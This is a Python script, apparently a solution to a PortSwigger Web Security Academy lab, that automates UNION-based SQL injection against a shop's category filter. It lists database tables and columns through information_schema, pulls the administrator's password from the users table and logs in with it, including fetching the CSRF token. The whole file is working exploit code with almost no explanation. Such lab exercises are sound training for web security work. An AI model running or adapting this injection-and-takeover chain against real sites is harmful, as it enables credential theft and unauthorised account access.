#https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle
from utils import *
import re

url='https://0ac400300450b5efa07941d300a500c1.web-security-academy.net/'
print(number_cols(url))

payload="filter?category=Lifestyle' UNION SELECT table_name, NULL FROM information_schema.tables--"
exploit=f'{url}{payload}'
response=requests.get(exploit)
soup = parse_html(response)
#im gonna cheat a little by using regex but its more fun this way
pattern=r'users_[^\s]+'
table_name=re.findall(pattern,soup.text)[0]

#not gonna check again the n of columns there is probably 2 again
payload=f"filter?category=Lifestyle' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='{table_name}'--"

soup=parse_html(requests.get(f"{url}{payload}"))
pattern_user=r'username_[^\s]+'
pattern_pass=r'password_[^\s]+'
password_col=re.findall(pattern_pass,soup.text)[0]
username_col=re.findall(pattern_user,soup.text)[0]
print(username_col,password_col)

payload=f"filter?category=' union select {username_col},{password_col} from {table_name}--"
soup=parse_html(requests.get(f"{url}{payload}"))
#some regex could be used to copy all the db data here but im not gonna do that
data=[row.text.split('\n') for row in soup.find_all('tr') if 'administrator' in row.text]

username='administrator'
password=data[0][2]

print(username,password)

session=requests.Session()
response=session.get(f'{url}login')
soup=parse_html(response)
token=soup.find('input')['value']

data={
    "username":username,
    "password":password,
    "csrf":token
}

response=session.post(f"{url}login",data=data)
soup=parse_html(response)
print(check_succes(soup))